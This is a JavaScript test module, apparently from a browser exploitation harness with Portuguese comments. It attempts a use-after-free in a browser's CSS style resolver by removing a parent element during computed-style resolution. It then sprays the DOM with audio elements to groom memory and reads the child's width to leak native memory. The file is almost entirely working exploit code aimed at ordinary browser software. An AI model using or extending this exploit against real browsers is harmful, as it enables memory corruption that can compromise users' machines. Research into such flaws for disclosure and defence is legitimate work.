import { Groomer } from '../mod_groomer.js';

export default {
    id:       'CSS_CUSTOM_PROPERTY_UAF',
    category: 'DOM',
    risk:     'HIGH',
    description:
        'UAF no CSS StyleResolver. Cria uma dependência de variáveis customizadas entre Pai e Filho. ' +
        'O Pai é removido da árvore durante a resolução do computed style do Filho, forçando ' +
        'a leitura de um objeto ComputedStyle libertado na memória nativa.',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');
        
        // O Pai define a variável
        this.parent = document.createElement('div');
        this.parent.style.setProperty('--toxic-var', '1337px');
        
        // O Filho herda e usa a variável
        this.child = document.createElement('div');
        this.child.style.width = 'var(--toxic-var)';
        
        this.parent.appendChild(this.child);
        this.sandbox.appendChild(this.parent);
        
        void this.parent.offsetWidth; // Constrói a árvore
    },

    trigger: function() {
        try {
            // O CSSOM C++ é chamado para resolver o filho
            let cs = window.getComputedStyle(this.child);
            
            // O GATILHO: Destruímos o pai síncronamente.
            // Em navegadores antigos, o ponteiro de resolução fica órfão.
            this.parent.remove();
            
            // Fragmentamos a memória para corromper o ComputedStyle do pai
            let trash = Groomer.sprayDOM('audio', 200);

            // A BOMBA: Lemos o valor. O C++ vai à memória do pai (agora corrompida) tentar ler '1337px'
            this.results.leakedValue = cs.getPropertyValue('width');
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Resolução CSS Concluída',
        
        s => {
            let val = s.results.leakedValue;
            if (val) {
                // Se leu '1337px', o WebKit protegeu bem. Se retornar vazio, mitigou.
                // Se retornar lixo, temos Leak! Extraímos os números.
                if (val !== '1337px' && val !== 'auto' && val !== '') {
                    let num = parseFloat(val);
                    if (!isNaN(num) && num > 2000) return num; // Retorna para acionar STALE DATA
                }
            }
            return 0; // Seguro
        }
    ],

    cleanup: function() {
        try { this.parent.remove(); this.child.remove(); } catch(e) {}
        this.parent = null;
        this.child = null;
        this.results = {};
    }
};
